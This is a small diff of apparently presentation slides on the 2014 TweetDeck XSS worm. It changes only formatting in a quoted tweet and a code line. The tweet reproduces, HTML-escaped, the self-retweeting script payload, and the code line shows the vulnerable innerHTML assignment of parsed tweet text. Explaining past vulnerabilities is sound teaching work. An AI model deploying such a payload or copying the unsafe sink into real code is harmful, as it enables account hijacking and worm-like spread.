@@ -751,7 +751,7 @@ In June of 2014, this tweet became very famous:
 </div>
 
 <blockquote class="twitter-tweet" lang="en">
-    <p>&lt;script class=&quot;xss&quot;&gt;$(&#39;.xss&#39;).parents().eq(1).find(&#39;a&#39;).eq(1).click();$(&#39;[data-action=retweet]&#39;).click();alert(&#39;XSS in Tweetdeck&#39;)&lt;/script&gt;♥</p>
+    <p>&lt;script class=&quot;xss&quot;&gt;<wbr/>$(&#39;.xss&#39;)<wbr/>.parents()<wbr/>.eq(1)<wbr/>.find(&#39;a&#39;)<wbr/>.eq(1)<wbr/>.click();<wbr/>$(&#39;[data-action=retweet]&#39;)<wbr/>.click();<wbr/>alert(&#39;XSS in Tweetdeck&#39;)<wbr/>&lt;/script&gt;<wbr/>♥</p>
     &mdash; *andy (@derGeruhn) <a href="https://twitter.com/derGeruhn/statuses/476764918763749376">June 11, 2014</a>
 </blockquote>
 
@@ -795,7 +795,7 @@ The relevant bit:
 </div>
 
 ```javascript
-w.innerHTML = TD.emoji.parse(t.nodeValue)
+w.innerHTML = TD.emoji.parse(t.nodeValue);
 ```
 
 <div class="notes">
